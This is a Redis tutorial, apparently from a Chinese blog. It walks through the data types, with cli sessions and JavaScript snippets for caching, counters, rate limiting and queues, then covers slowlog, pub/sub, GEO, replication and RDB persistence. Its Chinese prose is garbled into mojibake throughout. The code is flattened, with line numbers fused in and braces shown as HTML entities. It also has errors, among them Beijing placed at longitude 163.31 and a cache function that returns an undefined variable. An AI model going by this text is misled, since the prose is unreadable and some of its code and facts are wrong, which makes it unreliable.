[ex seconds] [px milliseconds] [nx|xx]// secondsï¼šå•ä½(ç§’)// milliseconds:å•ä½ï¼ˆæ¯«ç§’ï¼‰// nx:key å­˜åœ¨ä¸åšä»»ä½•æ“ä½œï¼Œç­‰ä»·äºŽsetnx// xx:key å­˜åœ¨åšæ“ä½œä¸Žnxç›¸åï¼Œç›¸å½“äºŽsetex mget mset mget/msetå¯ä»¥æ‰¹é‡èŽ·å–æˆ–è®¾ç½®å€¼ï¼Œå¦‚æžœä½¿ç”¨getå¤šæ¬¡è¯»å–æ•°æ®ç­‰ä»·äºŽnæ¬¡ç½‘ç»œæ—¶é—´+næ¬¡å‘½ä»¤æ—¶é—´ï¼Œè¿™ç§æ–¹æ³•å¯ä»¥ç”¨mgetä¼˜åŒ–ï¼Œç­‰ä»·äºŽ1æ¬¡ç½‘ç»œæ—¶é—´+næ¬¡å‘½ä»¤æ—¶é—´ï¼Œè¿™æ˜¯ä¸€ä¸ªO(n)æ“ä½œï¼Œé¿å…å‘½ä»¤è¿‡å¤šå®¢æˆ·ç«¯é˜»å¡ž 123456127.0.0.1:6379&gt; mset key1 val1 key2 val2 key3 val3OK127.0.0.1:6379&gt; mget key1 key2 key31) "val1"2) "val2"3) "val3" incr decr incrby decrby incrï¼šè‡ªå¢ž decrï¼šè‡ªå‡ incrbyï¼šæŒ‡å®šæ•°å­—è‡ªå¢ž decrbyï¼šæŒ‡å®šæ•°å­—è‡ªå‡ incrbyfloatï¼šæŒ‡å®šæµ®ç‚¹æ•°è‡ªå¢ž 12345incr keydecr keyincrby key incrementdecrby key decrementincrbyfloat key increment åº”ç”¨åœºæ™¯ç¼“å­˜ï¼Œå¯¹åŸŽå¸‚åˆ—è¡¨æ•°æ®è¿›è¡Œç¼“å­˜ 1234567891011// ä¼ªä»£ç function cityList()&#123; const redisKey = 'city'; let cities = redis.get(redisKey) if(!cities)&#123; cities = mongo.getCityList(); redis.set(redisKey,JSON.stringify(cities)); &#125; return cities;&#125; åˆ†å¸ƒå¼é” 1set key value [EX seconds] [PX milliseconds] [NX|XX] è®¡æ•°å™¨ï¼Œç½‘ç«™çš„PV/UVç»Ÿè®¡ï¼Œæ–‡ç« ç‚¹èµžã€é˜…è¯»é‡ï¼Œè§†é¢‘ç½‘ç»œçš„æ’­æ”¾é‡ï¼ŒRedisæä¾›çš„incrå‘½ä»¤å¯å®žçŽ°è®¡æ•°å™¨åŠŸèƒ½ï¼Œæ€§èƒ½å¥½å¤æ‚åº¦ä¸ºO(1) 1234const incrPageViewsCounter = pageId =&gt;&#123; const key = `page:views:$&#123;pageId&#125;`; return redis.incr(key);&#125; Sessionå­˜å‚¨ï¼ŒRedisä¸ä¼šå› ä¸ºæœåŠ¡å™¨é‡å¯å¯¼è‡´Sessionæ•°æ®ä¸¢å¤±ï¼Œå…·æœ‰æ•°æ®æŒä¹…åŒ–åŠŸèƒ½ã€‚ é™æµï¼ŒçŸ­ä¿¡å‘é€ä¸ºäº†é¿å…æŽ¥å£è¢«é¢‘ç¹è°ƒç”¨ï¼Œé€šå¸¸è¦åœ¨æŒ‡å®šæ—¶é—´å†…é¿å…é‡å¤å‘é€ 1234567891011121314const SMSLimit = async phone =&gt;&#123; const key = `sms:limit:$&#123;phone&#125;`; const result = await redis.set(key,1,'EX',60,'NX'); if(result === null)&#123; console.log('60s å†…æ— æ³•å†æ¬¡å‘é€éªŒè¯ç ') return false &#125; console.log('å¯ä»¥å‘é€') return true;&#125;SMSLimit(18800000000) å“ˆå¸Œå“ˆå¸Œç»“æž„æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œæ‰€æœ‰å‘½ä»¤éƒ½æ˜¯Hå¼€å¤´ï¼Œhashç±»åž‹å…¶å€¼æœ¬èº«å°±ç”±ä¸€ä¸ªæˆ–å¤šä¸ªfiled-valueæž„æˆ 1234567hashKey = &#123; filed1:value1, filed2:value2&#125;// ä¼˜ï¼šèŠ‚çœç©ºé—´ï¼Œå¯ä»¥éƒ¨åˆ†æ›´æ–°// ç¼ºï¼šä¸æ”¯æŒTTLè®¾ç½®ï¼ŒRedisä¸­è¿‡æœŸæ—¶é—´åªé’ˆå¯¹é¡¶çº§Key,æ— æ³•å¯¹Hash Keyçš„fieldè®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œåªèƒ½å¯¹æ•´ä¸ªKey é€šè¿‡expireè®¾ç½®// æ³¨æ„ï¼šåœ¨ä½¿ç”¨hgetallçš„æ—¶å€™æ³¨æ„ï¼Œé›†åˆå¾ˆå¤§å°†ä¼šæµªè´¹æ€§èƒ½ å¸¸è§å‘½ä»¤ å‘½ä»¤ å«ä¹‰ æ—¶é—´å¤æ‚åº¦ hset å¯¹keyçš„fieldè¿›è¡Œè®¾ç½® O(1) hget èŽ·å–keyæŒ‡å®šçš„field O(1) hdel åˆ é™¤keyæŒ‡å®šçš„field O(1) hincrby hincrbyfloat ç±»ä¼¼äºŽincrby incryfloat è¿™ä¸ªæ“ä½œçš„æ˜¯field O(1) hmset hmget å¯¹å¤šä¸ªfiled value è®¾ç½® è¯»å– O(n) hgetall èŽ·å–keyçš„æ‰€æœ‰field value O(n) hvals èŽ·å–keyçš„æ‰€æœ‰value O(n) hkeys èŽ·å–keyçš„æ‰€æœ‰fields O(n) 12345678910111213141516127.0.0.1:6379&gt; hset student name Jack(integer) 1127.0.0.1:6379&gt; hget student name"Jack"127.0.0.1:6379&gt; hmset student age 18 sex manOK127.0.0.1:6379&gt; hmget student sex age1) "man"2) "18"127.0.0.1:6379&gt; hgetall student1) "name"2) "Jack"3) "age"4) "18"5) "sex"6) "man" åº”ç”¨åœºæ™¯hashé€‚åˆå°†ä¸€äº›æ•°æ®å­˜å‚¨åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚ç¼“å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œä¸Žå­—ç¬¦ä¸²ä¸åŒçš„æ˜¯ï¼Œhashå¯ä»¥å¯¹ç”¨æˆ·ä¿¡æ¯ç»“æž„ä¸­çš„æ¯ä¸ªå­—æ®µå•ç‹¬å­˜å‚¨ï¼Œå½“éœ€è¦èŽ·å–ä¿¡æ¯æ—¶å¯ä»¥ä»…èŽ·å–éœ€è¦çš„éƒ¨åˆ†å­—æ®µã€‚å¦‚æžœç”¨å­—ç¬¦ä¸²å­˜å‚¨ï¼Œä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯å°†ä¿¡æ¯æ‹†åˆ†ä¸ºå¤šä¸ªé”®ï¼ˆæ¯ä¸ªå±žæ€§ä¸€ä¸ªé”®ï¼‰æ¥å­˜å‚¨ï¼Œå ç”¨è¿‡çš„keyåŒæ—¶å ç”¨ç©ºé—´ï¼›å¦å¤–ä¸€ç§æ–¹å¼æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²å­˜å‚¨ï¼Œè¿™ç§æ–¹å¼å¦‚æžœåŽ»æ•°æ®åªèƒ½å…¨éƒ¨å–å‡ºå¹¶ä¸”è¿˜è¦è¿›è¡Œååºåˆ—åŒ–ï¼Œåºåˆ—åŒ–/ååºåˆ—åŒ–ä¹Ÿæœ‰ä¸€å®šçš„å†…å­˜å¼€é”€ 123456789101112131415161718192021222324252627282930313233// ç¼“å­˜ç”¨æˆ·ä¿¡æ¯ä¾‹å­ï¼š// æ¨¡æ‹ŸæŸ¥è¯¢Mongoæ•°æ®const mongo = &#123; getUserInfoByUserId:userId =&gt;&#123; return&#123; name:'Jack', age:19 &#125; &#125;&#125;// èŽ·å–ç”¨æˆ·ä¿¡æ¯async function getUserInfo(userId)&#123; const key = `user:$&#123;userId&#125;`; try&#123; // ä»Žç¼“å­˜èŽ·å–æ•°æ® const userInfoCache = await redis.hgetall(key); // å¦‚æžœ userInfoCacheä¸ºç©ºï¼Œè¿”å›žå€¼ä¸º&#123;&#125; if(Object.keys(userInfoCache).length ===0)&#123; const userInfo = mongo.getUserInfoByUserId(userId); await redis.hmset(key,userInfo); await redis.expire(key,120); return userinfo; &#125; return userInfoCache; &#125;catch(err)&#123; console.error(err); throw err; &#125;&#125;getUserInfo(1) åˆ—è¡¨Redisçš„åˆ—è¡¨ç”¨æ¥å­˜å‚¨å­—ç¬¦ä¸²å…ƒç´ çš„é›†åˆï¼ŒåŸºäºŽLinked Listså®žçŽ°ï¼Œæ„å‘³ç€æ’å…¥ã€åˆ é™¤æ“ä½œéžå¸¸å¿«ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(1),ç´¢å¼•å¾ˆæ…¢ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(n) Redisåˆ—è¡¨å‘½ä»¤éƒ½æ˜¯Lå¼€å¤´ï¼Œåœ¨å®žé™…è¿ç”¨ä¸­å¯ä»¥ä½œä¸ºé˜Ÿåˆ—æˆ–è€…æ ˆ Stackï¼ˆæ ˆï¼‰ï¼šåŽè¿›å…ˆå‡ºï¼Œå®žçŽ°å‘½ä»¤lpush+lpop Queueï¼ˆé˜Ÿåˆ—ï¼‰ï¼šå…ˆè¿›å…ˆå‡ºï¼Œå®žçŽ°å‘½ä»¤lpush+rpop Capped Collection(æœ‰é™é›†åˆ)ï¼šlpush+ltrim Message Queue(æ¶ˆæ¯é˜Ÿåˆ—)ï¼šlpush+brpop å¸¸è§å‘½ä»¤ å‘½ä»¤ å«ä¹‰ æ—¶é—´å¤æ‚åº¦ lpush rpush åˆ—è¡¨å·¦ç«¯/å³ç«¯æ’å…¥ä¸€ä¸ªå€¼ O(1~n) linsert åˆ—è¡¨æŒ‡å®šçš„å€¼å‰/åŽæ’å…¥æ–°å€¼ O(n) lpop rpop åˆ—è¡¨å·¦ä¾§æˆ–è€…å³ä¾§å¼¹å‡ºä¸€ä¸ªå€¼ O(1) blpop brpop lpop rpop çš„é˜»å¡žç‰ˆæœ¬ï¼Œéœ€è®¾ç½®timeout O(1) ltrim æŒ‰ç…§ç´¢å¼•èŒƒå›´ä¿®å‰ªåˆ—è¡¨ O(n) lrange èŽ·å–æŒ‡å®šèŒƒå›´å†…çš„å…ƒç´ åˆ—è¡¨ O(n) llen èŽ·å–åˆ—è¡¨é•¿åº¦ O(1) lset è®¾ç½®åˆ—è¡¨æŒ‡å®šç´¢å¼•å€¼ä¸ºæ–°å€¼ O(n) 1234567891011121314151617181920212223242526272829303132333435363738394041424344# åˆ—è¡¨å·¦ä¾§åŠ å…¥ä¸‰ä¸ªå…ƒç´ 127.0.0.1:6379&gt; lpush languages JavaScript Python Go(integer) 3# èŽ·å–åˆ—è¡¨é•¿åº¦127.0.0.1:6379&gt; llen languages(integer) 3# èŽ·å–æŒ‡å®šèŒƒå›´å†…å…ƒç´ åˆ—è¡¨ ä»Žå·¦åˆ°å³ start/end-&gt;0/N-1 ä»Žå³åˆ°å·¦ start/end-&gt;-1/-N127.0.0.1:6379&gt; lrange languages 0 21) "Go"2) "Python"3) "JavaScript"# åˆ—è¡¨å³ä¾§æ’å…¥å…ƒç´ 127.0.0.1:6379&gt; rpush languages TypeScript(integer) 4# æŸ¥çœ‹åˆ—è¡¨çš„å…ƒç´ 127.0.0.1:6379&gt; lrange languages 0 31) "Go"2) "Python"3) "JavaScript"4) "TypeScript"# åˆ—è¡¨å·¦ç«¯ç§»é™¤ä¸€ä¸ªå…ƒç´ 127.0.0.1:6379&gt; lpop languages"Go"# åˆ—è¡¨å³ç«¯ç§»é™¤ä¸€ä¸ªå…ƒç´ 127.0.0.1:6379&gt; rpop languages"TypeScript"# è°çš„é‚£ä¸ªåˆ—è¡¨æŒ‡å®šç´¢å¼•å€¼ä¸ºæ–°å€¼127.0.0.1:6379&gt; lset languages 1 JSOK# åˆ—è¡¨æŒ‡å®šçš„å€¼å‰/åŽæ’å…¥æ–°å€¼127.0.0.1:6379&gt; linsert languages after JS Nodejs(integer) 3# æŒ‰ç…§ç´¢å¼•èŒƒå›´ä¿®å‰ªåˆ—è¡¨ï¼ˆå…ƒç´ æˆªå–ï¼‰127.0.0.1:6379&gt; ltrim languages 1 2OK åº”ç”¨åœºæ™¯æ¶ˆæ¯é˜Ÿåˆ—ï¼ŒRedis Listç»“æž„çš„lpushä¸Žbrpopå‘½ä»¤å¯å®žçŽ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œlpushå‘½ä»¤æ˜¯ä»Žå·¦ç«¯æ’å…¥æ•°æ®ï¼Œbrpopå‘½ä»¤æ˜¯ä»Žå³ç«¯é˜»å¡žå¼çš„è¯»å–æ•°æ®ï¼Œé˜»å¡žè¯»è¿‡ç¨‹ä¸­å¦‚æžœé˜Ÿåˆ—ä¸­æ²¡æœ‰æ•°æ®ï¼Œä¼šç«‹å³è¿›å…¥ä¼‘çœ ç›´åˆ°æ•°æ®åˆ°æ¥æˆ–è¶…è¿‡è®¾ç½®çš„timeoutæ—¶é—´ï¼Œä¼šç«‹å³é†’è¿‡æ¥ 123456789async function test()&#123; const key = 'languages'; // é˜»å¡žè¯»ï¼Œtimeoutä¸º5ç§’é’Ÿ const result = await redis.brpop(key,5); console.log(result);&#125;test();test(); é›†åˆRedisé›†åˆç±»åž‹å¯ç”¨æ¥å­˜å‚¨å¤šä¸ªå­—ç¬¦ä¸²å…ƒç´ ï¼Œå’Œåˆ—è¡¨ä¸åŒï¼Œé›†åˆå…ƒç´ ä¸å…è®¸é‡å¤ï¼Œé›†åˆä¸­çš„å…ƒç´ æ˜¯æ— é¡»çš„ï¼Œä¹Ÿä¸èƒ½é€šè¿‡ç´¢å¼•ä¸‹æ ‡èŽ·å–å…ƒç´ ã€‚Redisé›†åˆçš„å‘½ä»¤éƒ½æ˜¯Så¼€å¤´ å¸¸ç”¨å‘½ä»¤ å‘½ä»¤ å«ä¹‰ æ—¶é—´å¤æ‚åº¦ sadd é›†åˆä¸­æ·»åŠ å…ƒç´ ï¼Œå¦‚æžœå…ƒç´ é‡å¤åˆ™æ·»åŠ å¤±è´¥ O(1) srem åˆ é™¤é›†åˆä¸­çš„å…ƒç´  O(1) scard è®¡ç®—é›†åˆä¸­çš„å…ƒç´ ä¸ªæ•° O(1) sismember åˆ¤æ–­é›†åˆä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šå…ƒç´  O(count) srandmember éšæœºä»Žé›†åˆä¸­è¿”å›žæŒ‡å®šå…ƒç´  O(n) sinter æ±‚é›†åˆäº¤é›† sunion æ±‚é›†åˆå¹¶é›† sdiff æ±‚é›†åˆå·®é›† 123456789101112131415161718192021222324252627282930313233343536373839404142434445# é›†åˆä¸­æ·»åŠ å…ƒç´ 127.0.0.1:6379&gt; sadd languages2 Nodejs JavaScript(integer) 2# è®¡ç®—é›†åˆä¸­å…ƒç´ ä¸ªæ•°127.0.0.1:6379&gt; scard languages2(integer) 2# åˆ¤æ–­é›†åˆä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šå…ƒç´  1 å­˜åœ¨ 0ä¸å­˜åœ¨127.0.0.1:6379&gt; sismember languages2 Nodejs(integer) 1127.0.0.1:6379&gt; sismember languages2 Nodejs1(integer) 0# éšæœºä»Žé›†åˆä¸­è¿”å›žnä¸ªå…ƒç´ 127.0.0.1:6379&gt; srandmember languages2 21) "JavaScript"2) "Nodejs"127.0.0.1:6379&gt; srandmember languages2 31) "JavaScript"2) "Nodejs"# è®¾ç½®ç”¨æˆ·1 ä½¿ç”¨çš„è¯­è¨€127.0.0.1:6379&gt; sadd user:1 Nodejs JavaScript(integer) 2# è®¾ç½®ç”¨æˆ·2 ä½¿ç”¨çš„è¯­è¨€127.0.0.1:6379&gt; sadd user:2 Nodejs Python(integer) 2# æ±‚ user:1ä¸Ž user:2 äº¤é›†127.0.0.1:6379&gt; sinter user:1 user:21) "Nodejs"# æ±‚user:1 ä¸Ž user:2 å¹¶é›†127.0.0.1:6379&gt; sunion user:1 user:21) "JavaScript"2) "Nodejs"3) "Python"# æ±‚user:1 ä¸Ž user:2 å·®é›†127.0.0.1:6379&gt; sdiff user:1 user:21) "JavaScript" åº”ç”¨åœºæ™¯æŠ½å¥–ï¼ŒRedisçš„ç»“åˆæœ‰åŽ»é‡åŠŸèƒ½ï¼Œä¸€äº›æŠ½å¥–ç±»é¡¹ç›®ä¸­å¯ä»¥å­˜å‚¨ä¸­å¥–çš„ç”¨æˆ·Id,èƒ½å¤Ÿä¿è¯åŒä¸€ä¸ªç”¨æˆ·Idä¸ä¼šä¸­å¥–ä¸¤æ¬¡ 1234567891011121314async function test(userId)&#123; const key = 'luck:users'; const result = await redis.sadd(key,userId); // å¦‚æžœå…ƒç´ å­˜åœ¨ï¼Œè¿”å›ž0è¡¨ç¤ºæœªæ·»åŠ æˆåŠŸ if(result === 0)&#123; console.log('æ‚¨å·²ä¸­é—´ä¸€æ¬¡ï¼Œæ— æ³•å†æ¬¡å‚ä¸Ž'); return false &#125; console.log('æ­å–œæ‚¨ä¸­å¥–') return true;&#125;test(1); è®¡ç®—ç”¨æˆ·å…±åŒæ„Ÿå…´è¶£çš„å•†å“ï¼Œsaddä¸Žsinterå¯ä»¥ç”¨æ¥ç»Ÿè®¡ç”¨æˆ·å…±åŒæ„Ÿå…´è¶£çš„å•†å“ï¼Œsaddä¿å­˜æ¯ä¸ªç”¨æˆ·å–œæ¬¢çš„å•†å“æ ‡ç­¾ï¼Œä½¿ç”¨sinterå¯¹æ¯ä¸ªç”¨æˆ·æ„Ÿå…´è¶£çš„å•†å“æ ‡ç­¾æ±‚äº¤é›† æœ‰åºé›†åˆRedisæœ‰åºé›†åˆzsetä¿ç•™äº†é›†åˆsetå…ƒç´ ä¸èƒ½é‡å¤çš„ç‰¹å¾ä¹‹å¤–ï¼Œåœ¨æœ‰åºé›†åˆçš„å…ƒç´ ä¸­æ˜¯å¯ä»¥æŽ’åºçš„ï¼Œä¸Žåˆ—è¡¨ä½¿ç”¨ç´¢å¼•ä¸‹æ ‡ä¸åŒçš„æ˜¯æœ‰åºé›†åˆæ˜¯æœ‰åºé›†åˆç»™æ¯ä¸ªå…ƒç´ è®¾ç½®ä¸€ä¸ªåˆ†å€¼ï¼ˆscoreï¼‰ä½œä¸ºæŽ’åºçš„ä¾æ® Redisæœ‰åºé›†åˆæ˜¯Zå¼€å¤´çš„ å¸¸è§å‘½ä»¤ å‘½ä»¤ å«ä¹‰ æ—¶é—´å¤æ‚åº¦ zadd é›†åˆä¸­æ·»åŠ å…ƒç´  O(logN) zrem é›†åˆä¸­åˆ é™¤å…ƒç´  O(1) zscore è¿”å›žé›†åˆçš„åˆ†æ•° O(1) zincrby å¢žåŠ æˆ–è€…å‡å°‘é›†åˆçš„åˆ†æ•° O(1) zcard è¿”å›žå…ƒç´ çš„ä¸ªæ•° O(1) zadd 123456zadd key [NX|XX] [CH] [INCR] score member [sroce member ...]# [NX|XX]ï¼šNX memberå¿…é¡»ä¸å­˜åœ¨æ‰æ·»åŠ æˆåŠŸï¼Œç”¨æˆ·Create;XX,member å¿…é¡»å­˜åœ¨æ‰èƒ½æ›´æ–°æˆåŠŸï¼Œç”¨äºŽUPDATE# [CH]ï¼šè¿”å›žæ­¤æ¬¡æ“ä½œåŽæœ‰åºé›†åˆå…ƒç´ å’Œåˆ†æ•°å‘ç”Ÿçš„å˜åŒ–# [INCR]ï¼šå¯¹scoreåšå¢žåŠ ï¼Œç›¸å½“äºŽ zincrby# scoreï¼šä»£è¡¨åˆ†æ•°ï¼ˆæŽ’åºï¼‰# memberï¼šæˆå‘˜ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# æœ‰åºé›†åˆ grages ä¸­æ·»åŠ 3ä¸ªå…ƒç´ 127.0.0.1:6379&gt; zadd grades NX 80 xiaoming 75 xiaozhang 85 xiaoli(integer) 3# æŸ¥çœ‹æˆå‘˜ xiaozhang åˆ†æ•°127.0.0.1:6379&gt; zscore grades xiaozhang"75"# æ›´æ–°æˆå‘˜ xiaozhang åˆ†æ•°127.0.0.1:6379&gt; zadd grades XX 90 xiaozhang(integer) 0# å†æ¬¡æŸ¥çœ‹æˆå‘˜xiaozhangåˆ†æ•°127.0.0.1:6379&gt; zscore grades xiaozhang"90"# æŸ¥çœ‹æˆå‘˜æŽ’å# åˆ†æ•°ä»Žä½Žåˆ°é«˜127.0.0.1:6379&gt; zrank grades xiaozhang(integer) 2# åˆ†æ•°ä»Žé«˜åˆ°ä½Ž127.0.0.1:6379&gt; zrevrank grades xiaozhang(integer) 0# å¢žåŠ æˆå‘˜åˆ†æ•°127.0.0.1:6379&gt; zincrby grades 5 xiaozhang"95"# è¿”å›žæŒ‡å®šèŒƒå›´æˆå‘˜æŽ’åï¼ŒWITHSCORESå¯é€‰å‚æ•°ï¼ŒåŽ»æŽ‰åˆ™ä¸è¿”å›žåˆ†æ•°127.0.0.1:6379&gt; zrange grades 0 2 WITHSCORES1) "xiaoming"2) "80"3) "xiaoli"4) "85"5) "xiaozhang"6) "95"# è¿”å›žæŒ‡å®šåˆ†æ•°èŒƒå›´å†…çš„æˆå‘˜åˆ—è¡¨127.0.0.1:6379&gt; zrangebyscore grades 85 1001) "xiaoli"2) "xiaozhang"# åˆ é™¤æŒ‡å®šæˆå‘˜127.0.0.1:6379&gt; zrem grades xiaoli(integer) 1 é«˜çº§ç‰¹æ€§æ…¢æŸ¥è¯¢Redisæ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼šå‘é€å‘½ä»¤-&gt;æŽ’é˜Ÿ-&gt;æ‰§è¡Œå‘½ä»¤-&gt;è¿”å›žç»“æžœï¼Œæ…¢æŸ¥è¯¢é€šå¸¸å‘ç”Ÿåœ¨æ‰§è¡Œå‘½ä»¤é˜¶æ®µï¼Œå¯ä»¥é€šè¿‡æ—¥å¿—æŸ¥è¯¢ç³»ç»Ÿslowlogè¿›è¡Œé—®é¢˜å®šä½è·Ÿè¸ª åœ¨é…ç½®æ–‡ä»¶ä¸­redis.confè®¾ç½®ï¼š slowlog-max-lenï¼šè¡¨ç¤ºæ…¢æŸ¥è¯¢æœ€å¤§çš„æ¡æ•°ï¼Œé»˜è®¤128ï¼Œä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå½“è¶…è¿‡é¢„å…ˆè®¾ç½®çš„å€¼åŽä¼šå°†æœ€æ—©çš„slowlogåˆ é™¤ï¼Œæ˜¯ä¸ªå…ˆè¿›å…ˆå‡ºé˜Ÿåˆ— slow-log-slower-thanï¼šæ…¢æŸ¥è¯¢é˜€å€¼ï¼Œé»˜è®¤10000å¾®å¦™ï¼Œåªæœ‰å‘½ä»¤æ‰§è¡Œæ—¶é—´å¤§äºŽè¯¥é˜€å€¼æ‰ä¼šè¢«slowlogè®°å½•ï¼Œå¦‚æžœè®°å½•æ‰€æœ‰å‘½ä»¤å°†é˜€å€¼è®¾ç½®ä¸º0 Redisæ˜¯æ¯ç§’ä¸‡çº§åˆ«ï¼Œè®¾ç½®é˜€å€¼æ—¶å€™ï¼Œé»˜è®¤ä¸º10000å¾®ç§’ï¼ˆ10æ¯«ç§’ï¼‰ï¼Œä¸è¦è®¾ç½®å¤ªå¤§ï¼Œå»ºè®®1æ¯«ç§’ä¹‹ä¸‹ï¼Œæ‰æœ‰æ„ä¹‰ã€‚å®šæœŸå°†æ…¢æŸ¥è¯¢æŒä¹…åŒ–åˆ°å…¶ä»–æ•°æ®åº“ï¼Œä¾¿äºŽæŽ’æŸ¥ã€‚ æ…¢æŸ¥è¯¢å‘½ä»¤ï¼š slowlog get [n]ï¼šèŽ·å–æ…¢æŸ¥è¯¢é˜Ÿåˆ— slowlog lenï¼šèŽ·å–æ…¢æŸ¥è¯¢é˜Ÿåˆ—é•¿åº¦ slowlog resetï¼šæ¸…ç©ºæ…¢æŸ¥è¯¢é˜Ÿåˆ— pipelineæ ¸å¿ƒ1æ¬¡ç½‘ç»œè¯·æ±‚å¤„ç†næ¡å‘½ä»¤ï¼Œredisæœ¬èº«å‘½ä»¤å¤„ç†æ—¶é—´æ˜¯å¾®ç§’çº§åˆ«ï¼Œpipelineä¸»è¦å‡å°‘ç½‘ç»œä¼ è¾“è¦æ±‚ å‘å¸ƒè®¢é˜…è§’è‰²ï¼šå‘å¸ƒè€…ï¼ˆpublisherï¼‰/è®¢é˜…è€…ï¼ˆsubscriberï¼‰/é¢‘é“ï¼ˆchannelï¼‰: å‘å¸ƒæ¶ˆæ¯publish channel message è®¢é˜…æ¶ˆæ¯ subscribe [channel]ï¼Œå¯ä»¥è®¢é˜…å¤šä¸ªé¢‘é“ å–æ¶ˆè®¢é˜… unsubscribe [channel] BitMapsï¼ˆä½å›¾ï¼‰CEOç”¨äºŽåœ°ç†ä½ç½®å®šä½ï¼ŒåŸºäºŽzsetå®žçŽ°çš„ï¼š geoadd key longitude latitude memberå¢žåŠ åœ°ç†ä½ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šgeoadd cities: 163.31 39.99 beijing geopos key member [member...],èŽ·å–åœ°ç†ä½ç½®æ¶ˆæ¯ï¼Œä¾‹å¦‚geopos cities: beijing geodist key member1 member2 [unit]ï¼šèŽ·å–ä¸¤åœ°å€ä½ç½®è·ç¦»ï¼Œunitä¸ºå•ä½ï¼ˆm/km/mi/ftï¼‰,ä¾‹å¦‚ï¼šgeodist cities: beijing shanghai km ä¸»ä»Žå¤åˆ¶å•æœºå¸¦æ¥çš„é—®é¢˜æœºå™¨æ•…éšœã€å®¹é‡é™åˆ¶ã€QPSç“¶é¢ˆï¼Œä¸»ä»Žå¤åˆ¶æ˜¯ä¸€ç§ä¸€ä¸»å¤šä»Žçš„æ¨¡å¼æä¾›äº†æ•°æ®å‰¯æœ¬ï¼Œè§£å†³äº†å•æœºå¸¦æ¥çš„æœºå™¨æ•…éšœé—®é¢˜ï¼Œå¦å¤–ä¸»ä»Žåˆ†ç¦»æ¨¡å¼è¿˜æä¾›äº†Redisè¯»çš„æ€§èƒ½ï¼Œä¹Ÿæ˜¯é«˜å¯ç”¨ï¼Œåˆ†å¸ƒå¼çš„åŸºç¡€ã€‚ æ‰€è°“çš„ä¸»ä»Žå¤åˆ¶å°±æ˜¯ä¸€ä¸ªRedisä¸»èŠ‚ç‚¹æ‹¥æœ‰å¤šä¸ªä»ŽèŠ‚ç‚¹ï¼Œç”±ä¸»èŠ‚ç‚¹çš„æ•°æ®å•å‘å¤åˆ¶åˆ°ä»ŽèŠ‚ç‚¹ï¼Œåœ¨ä¸€äº›è¯»å¤šå†™å°‘çš„ä¸šåŠ¡åœºæ™¯éžå¸¸å—ç”¨ æ•°æ®æŒä¹…åŒ–Redisæ•°æ®å­˜å‚¨éƒ½æ˜¯å†…å­˜é‡Œï¼Œå¯¹æ•°æ®çš„æ›´æ–°å¼‚æ­¥çš„å­˜å‚¨åœ¨ç£ç›˜é‡Œï¼Œåœ¨Redisä¸­çš„æ•°æ®æŒä¹…åŒ–æœ‰ä¸¤ç§ç­–ç•¥ï¼ŒRDBå¿«ç…§ï¼ŒAOFæ—¥åŽ† RDBæŠŠå½“å‰å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥ç£ç›˜ï¼Œæ¢å¤æ—¶å°†å¿«ç…§æ–‡ä»¶ç›´æŽ¥è¯»åˆ°å†…å­˜é‡Œã€‚ è§¦å‘æœºåˆ¶saveå’Œbgsaveç”Ÿæˆå¿«ç…§ saveï¼šä½¿ç”¨saveä¼šé€ æˆå®¢æˆ·ç«¯é˜»å¡žï¼Œå®ƒä½¿ç”¨ä¸€ç§åŒæ­¥çš„æ–¹å¼ç”ŸæˆRDBå¿«ç…§æ–‡ä»¶ï¼Œå› ä¸ºRedisæ˜¯å•çº¿ç¨‹ï¼Œå¦‚æžœsaveè¿‡ç¨‹å¾ˆé•¿ä¹Ÿä¼šé˜»å¡žå…¶ä»–å®¢æˆ·ç«¯çš„å‘½ä»¤ï¼Œåœ¨ç”Ÿäº§ä¸­æ˜¯ä¸å»ºè®®ä½¿ç”¨çš„ bgsaveï¼šä½¿ç”¨bgsave Redisä¼šforkä¸€ä¸ªå­è¿›ç¨‹æ¥è´Ÿè´£ç”ŸæˆRDBæ–‡ä»¶ï¼Œç”±äºŽbgsaveæ˜¯å¼‚æ­¥è¿›è¡Œçš„å¹¶ä¸ä¼šé˜»å¡žå…¶ä»–å®¢æˆ·ç«¯çš„å‘½ä»¤ï¼Œbgsaveæ¨¡å¼ä¸‹é˜»å¡žé˜¶æ®µå‘ç”Ÿåœ¨forkè¿‡ç¨‹ä¸­ æŒä¹…åŒ–é…ç½®å…¶ä¸­stop-writes-on-bgsave-errorè¿™ä¸ªé…ç½®å¾ˆé‡è¦ï¼Œå¦‚æžœå­è¿›ç¨‹(ä¹Ÿå°±æ˜¯å¤‡ç”¨ç»å¸¸)åœ¨åŽå°ç”Ÿæˆå¿«ç…§å¤±è´¥ï¼Œä¸»ç»å¸¸ä¼šåœæ­¢æ–°çš„å†™å…¥æ“ä½œï¼Œä¹Ÿæ˜¯ä¸ºäº†ä¿æŒæ•°æ®ä¸€è‡´æ€§ 12345678910111213141516171819# æŒä¹…åŒ–é»˜è®¤æ—¶é—´ç­–ç•¥save 900 1 # å¦‚æžœä»…æœ‰1-9æ¬¡æ›´æ”¹æ“ä½œï¼Œé‚£ä¹ˆè¦900sæ‰å†™å…¥ç¡¬ç›˜ä¸€æ¬¡save 300 10 # å¦‚æžœä»…æœ‰10-9999æ¬¡æ›´æ”¹æ“ä½œï¼Œé‚£ä¹ˆè¦300sæ‰å†™å…¥ç¡¬ç›˜ä¸€æ¬¡save 60 10000 # å¦‚æžœè¶…è¿‡10000æ¬¡æ›´æ”¹æ“ä½œï¼Œé‚£ä¹ˆ60sæ‰ä¼šå†™å…¥ç¡¬ç›˜ä¸€æ¬¡# RBD æ–‡ä»¶åç§°ï¼Œå»ºè®® dump-6379.rdbdbfilename dump.rdb# 